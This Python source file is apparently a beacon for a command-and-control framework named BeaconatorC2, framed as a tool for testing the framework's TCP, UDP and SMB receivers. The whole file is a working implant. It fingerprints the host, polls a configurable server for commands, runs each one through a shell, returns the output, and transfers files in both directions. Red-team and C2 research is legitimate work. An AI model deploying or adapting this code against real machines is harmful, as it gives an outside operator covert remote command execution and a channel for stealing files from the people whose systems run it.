#!/usr/bin/env python3
"""
Python Beacon for BeaconatorC2 Testing
Multi-protocol beacon supporting TCP, UDP, and SMB communication
Designed for testing UDP and SMB receiver implementations
"""

import socket
import subprocess
import time
import hashlib
import platform
import uuid
import os
import sys
import argparse
import threading
import base64
from pathlib import Path


class PythonBeacon:
    def __init__(self, server_ip="127.0.0.1", server_port=5074, protocol="tcp", pipe_name=None):
        self.server_ip = server_ip
        self.server_port = server_port
        self.protocol = protocol.lower()
        self.pipe_name = pipe_name or f"BeaconatorC2_{server_port}"
        
        self.agent_id = self.generate_agent_id()
        self.computer_name = platform.node()
        self.check_in_interval = 15  # seconds
        self.is_running = False
        
        print(f"[+] Python Beacon initialized")
        print(f"    Agent ID: {self.agent_id}")
        print(f"    Computer: {self.computer_name}")
        print(f"    Protocol: {self.protocol.upper()}")
        print(f"    Server: {self.server_ip}:{self.server_port}")
        if self.protocol == "smb":
            print(f"    Pipe: {self.pipe_name}")

    def generate_agent_id(self):
        """Generate unique agent ID based on system information"""
        system_info = f"{platform.node()}{platform.system()}"
        
        # Add username (with fallback)
        try:
            username = os.getlogin()
        except:
            try:
                username = os.environ.get('USER', os.environ.get('USERNAME', 'unknown'))
            except:
                username = 'unknown'
        system_info += username
        
        # Add MAC address
        try:
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                          for elements in range(0,2*6,2)][::-1])
            system_info += mac
        except:
            pass
            
        # Add script path
        system_info += os.path.abspath(__file__)
        
        # Generate hash
        return hashlib.md5(system_info.encode()).hexdigest()[:8]

    def log(self, message):
        """Simple logging function"""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] {message}")

    def send_tcp(self, message, expect_response=True, is_file_transfer=False):
        """Send message via TCP"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((self.server_ip, self.server_port))
            
            sock.send(message.encode('utf-8'))
            
            if expect_response:
                if is_file_transfer:
                    return sock  # Return socket for file operations
                else:
                    response = sock.recv(4096).decode('utf-8').strip()
                    sock.close()
                    return response
            else:
                sock.close()
                return "OK"
                
        except Exception as e:
            self.log(f"TCP Error: {e}")
            return f"ERROR: {e}"

    def send_udp(self, message, expect_response=True):
        """Send message via UDP"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(10)
            
            # Send UDP datagram
            bytes_sent = sock.sendto(message.encode('utf-8'), (self.server_ip, self.server_port))
            self.log(f"UDP: Sent {bytes_sent} bytes to {self.server_ip}:{self.server_port}")
            
            if expect_response:
                try:
                    response, addr = sock.recvfrom(4096)
                    sock.close()
                    response_str = response.decode('utf-8').strip()
                    self.log(f"UDP: Received response from {addr}: {response_str}")
                    return response_str
                except socket.timeout:
                    sock.close()
                    self.log("UDP: No response received (timeout)")
                    return "ERROR: No response (timeout)"
            else:
                sock.close()
                return "OK"
                
        except Exception as e:
            self.log(f"UDP Error: {e}")
            return f"ERROR: {e}"

    def send_smb(self, message, expect_response=True, is_file_transfer=False):
        """Send message via SMB named pipe"""
        try:
            if os.name == 'nt':  # Windows
                pipe_path = f"\\\\.\\pipe\\{self.pipe_name}"
                
                # Try to open the named pipe
                import msvcrt
                pipe_handle = os.open(pipe_path, os.O_RDWR | os.O_BINARY)
                
                os.write(pipe_handle, message.encode('utf-8'))
                
                if expect_response:
                    if is_file_transfer:
                        return pipe_handle  # Return handle for file operations
                    else:
                        response = os.read(pipe_handle, 4096).decode('utf-8').strip()
                        os.close(pipe_handle)
                        return response
                else:
                    os.close(pipe_handle)
                    return "OK"
                    
            else:  # Unix-like (FIFO)
                pipe_path = f"/tmp/beaconator_c2_pipes/{self.pipe_name}"
                
                if not os.path.exists(pipe_path):
                    self.log(f"SMB pipe not found: {pipe_path}")
                    return "ERROR: Pipe not found"
                
                # Write to FIFO
                with open(pipe_path, 'w') as pipe:
                    pipe.write(message)
                    pipe.flush()
                
                if expect_response:
                    # Read response from FIFO (simplified)
                    with open(pipe_path, 'r') as pipe:
                        response = pipe.read().strip()
                        return response
                else:
                    return "OK"
                
        except Exception as e:
            self.log(f"SMB Error: {e}")
            return f"ERROR: {e}"

    def send_message(self, message, expect_response=True, is_file_transfer=False):
        """Send message using configured protocol"""
        if self.protocol == "tcp":
            return self.send_tcp(message, expect_response, is_file_transfer)
        elif self.protocol == "udp":
            if is_file_transfer:
                return "ERROR: File transfer not supported over UDP"
            return self.send_udp(message, expect_response)
        elif self.protocol == "smb":
            return self.send_smb(message, expect_response, is_file_transfer)
        else:
            return f"ERROR: Unknown protocol {self.protocol}"

    def register(self):
        """Register beacon with server"""
        message = f"register|{self.agent_id}|{self.computer_name}"
        self.log(f"Attempting registration with message: {message}")
        response = self.send_message(message)
        self.log(f"Registration response: {response}")
        return response

    def request_action(self):
        """Request pending action from server"""
        message = f"request_action|{self.agent_id}"
        response = self.send_message(message)
        return response

    def send_checkin(self):
        """Send checkin heartbeat"""
        message = f"checkin|{self.agent_id}"
        response = self.send_message(message, expect_response=False)
        return response

    def execute_command(self, command):
        """Execute system command"""
        try:
            self.log(f"Executing: {command}")
            
            # Execute command
            result = subprocess.run(
                command, 
                shell=True, 
                capture_output=True, 
                text=True, 
                timeout=300
            )
            
            # Combine stdout and stderr
            output = ""
            if result.stdout:
                output += f"STDOUT:\n{result.stdout}\n"
            if result.stderr:
                output += f"STDERR:\n{result.stderr}\n"
            if not output:
                output = f"Command executed (exit code: {result.returncode})"
                
            return output.strip()
            
        except subprocess.TimeoutExpired:
            return "ERROR: Command timeout (300s)"
        except Exception as e:
            return f"ERROR: {e}"

    def send_command_output(self, output):
        """Send command output to server"""
        message = f"command_output|{self.agent_id}|{output}"
        response = self.send_message(message, expect_response=False)
        return response

    def download_file(self, filename):
        """Download file from server"""
        if self.protocol == "udp":
            return "ERROR: File transfer not supported over UDP"
            
        try:
            message = f"to_agent|{filename}"
            
            if self.protocol == "tcp":
                sock = self.send_message(message, expect_response=True, is_file_transfer=True)
                if isinstance(sock, str) and sock.startswith("ERROR"):
                    return sock
                    
                # Receive file data
                file_data = b""
                while True:
                    chunk = sock.recv(8192)
                    if not chunk:
                        break
                    file_data += chunk
                sock.close()
                
            elif self.protocol == "smb":
                # SMB file transfer (simplified)
                pipe_handle = self.send_message(message, expect_response=True, is_file_transfer=True)
                if isinstance(pipe_handle, str) and pipe_handle.startswith("ERROR"):
                    return pipe_handle
                    
                # Read file data from pipe
                file_data = b""
                if os.name == 'nt':
                    while True:
                        try:
                            chunk = os.read(pipe_handle, 8192)
                            if not chunk:
                                break
                            file_data += chunk
                        except:
                            break
                    os.close(pipe_handle)
                else:
                    # Unix FIFO - simplified read
                    with open(f"/tmp/beaconator_c2_pipes/{self.pipe_name}", 'rb') as pipe:
                        file_data = pipe.read()
            
            # Save file
            downloads_dir = Path.home() / "Downloads" / "beacon_downloads"
            downloads_dir.mkdir(exist_ok=True)
            
            file_path = downloads_dir / filename
            with open(file_path, 'wb') as f:
                f.write(file_data)
                
            return f"File downloaded: {file_path} ({len(file_data)} bytes)"
            
        except Exception as e:
            return f"ERROR downloading file: {e}"

    def upload_file(self, filename):
        """Upload file to server"""
        if self.protocol == "udp":
            return "ERROR: File transfer not supported over UDP"
            
        try:
            # Check if file exists
            file_path = Path(filename)
            if not file_path.exists():
                return f"ERROR: File not found: {filename}"
                
            message = f"from_agent|{file_path.name}"
            
            if self.protocol == "tcp":
                sock = self.send_message(message, expect_response=True, is_file_transfer=True)
                if isinstance(sock, str) and sock.startswith("ERROR"):
                    return sock
                    
                # Wait for READY response
                ready_response = sock.recv(1024).decode('utf-8').strip()
                if ready_response != "READY":
                    sock.close()
                    return f"ERROR: Server not ready: {ready_response}"
                
                # Send file data
                with open(file_path, 'rb') as f:
                    while True:
                        chunk = f.read(8192)
                        if not chunk:
                            break
                        sock.send(chunk)
                
                # Get response
                response = sock.recv(1024).decode('utf-8').strip()
                sock.close()
                return response
                
            elif self.protocol == "smb":
                # SMB file upload (simplified)
                pipe_handle = self.send_message(message, expect_response=True, is_file_transfer=True)
                if isinstance(pipe_handle, str) and pipe_handle.startswith("ERROR"):
                    return pipe_handle
                    
                # Send file data through pipe
                with open(file_path, 'rb') as f:
                    file_data = f.read()
                    
                if os.name == 'nt':
                    os.write(pipe_handle, file_data)
                    response = os.read(pipe_handle, 1024).decode('utf-8').strip()
                    os.close(pipe_handle)
                else:
                    # Unix FIFO - simplified write
                    with open(f"/tmp/beaconator_c2_pipes/{self.pipe_name}", 'wb') as pipe:
                        pipe.write(file_data)
                    response = "SUCCESS"  # Simplified for Unix
                    
                return response
                
        except Exception as e:
            return f"ERROR uploading file: {e}"

    def process_command(self, command_data):
        """Process command from server"""
        try:
            # Check for standard "no command" responses from server
            no_command_responses = [
                "", 
                "No commands queued", 
                "no_pending_commands",
                "No pending commands"
            ]
            
            if not command_data or command_data in no_command_responses:
                return None
                
            self.log(f"Processing: {command_data}")
            
            # Handle different command types
            if command_data.startswith("execute_command|"):
                _, cmd = command_data.split("|", 1)
                output = self.execute_command(cmd)
                self.send_command_output(output)
            elif "|" not in command_data:
                # Simple command execution
                output = self.execute_command(command_data)
                self.send_command_output(output)
                
            else:
                self.log(f"Unknown command format: {command_data}")
                
        except Exception as e:
            self.log(f"Error processing command: {e}")
            self.send_command_output(f"ERROR: {e}")

    def test_connectivity(self):
        """Test basic connectivity to server"""
        self.log(f"Testing {self.protocol.upper()} connectivity to {self.server_ip}:{self.server_port}")
        
        if self.protocol == "udp":
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(5)
                test_message = "test|ping"
                bytes_sent = sock.sendto(test_message.encode('utf-8'), (self.server_ip, self.server_port))
                self.log(f"UDP test: Sent {bytes_sent} bytes")
                
                try:
                    response, addr = sock.recvfrom(1024)
                    self.log(f"UDP test: Received response from {addr}")
                    sock.close()
                    return True
                except socket.timeout:
                    self.log("UDP test: No response received (this may be normal)")
                    sock.close()
                    return True  # UDP might not respond to test messages
            except Exception as e:
                self.log(f"UDP test failed: {e}")
                return False
        
        return True  # Skip test for other protocols

    def run(self):
        """Main beacon loop"""
        self.log("Starting beacon...")
        
        # Test connectivity first
        if not self.test_connectivity():
            self.log("Connectivity test failed - check server and port configuration")
            return
        
        # Initial registration
        self.register()
        self.is_running = True
        
        try:
            while self.is_running:
                try:
                    # Request action from server
                    action = self.request_action()
                    
                    if action and not action.startswith("ERROR"):
                        self.process_command(action)
                    
                    # Send checkin
                    self.send_checkin()
                    
                    # Wait before next cycle
                    time.sleep(self.check_in_interval)
                    
                except KeyboardInterrupt:
                    self.log("Beacon interrupted by user")
                    break
                except Exception as e:
                    self.log(f"Beacon error: {e}")
                    time.sleep(5)  # Wait before retry
                    
        except Exception as e:
            self.log(f"Fatal beacon error: {e}")
        finally:
            self.is_running = False
            self.log("Beacon stopped")


def main():
    parser = argparse.ArgumentParser(description="Python Beacon for BeaconatorC2 Testing")
    parser.add_argument("--server", default="127.0.0.1", help="Server IP address")
    parser.add_argument("--port", type=int, default=5074, help="Server port")
    parser.add_argument("--protocol", choices=["tcp", "udp", "smb"], default="tcp", 
                       help="Communication protocol")
    parser.add_argument("--pipe", help="SMB pipe name (for SMB protocol)")
    parser.add_argument("--interval", type=int, default=15, help="Check-in interval in seconds")
    
    args = parser.parse_args()
    
    # Create and run beacon
    beacon = PythonBeacon(
        server_ip=args.server,
        server_port=args.port,
        protocol=args.protocol,
        pipe_name=args.pipe
    )
    
    beacon.check_in_interval = args.interval
    
    try:
        beacon.run()
    except KeyboardInterrupt:
        print("\n[!] Beacon terminated by user")
    except Exception as e:
        print(f"[!] Beacon failed: {e}")


if __name__ == "__main__":
    main()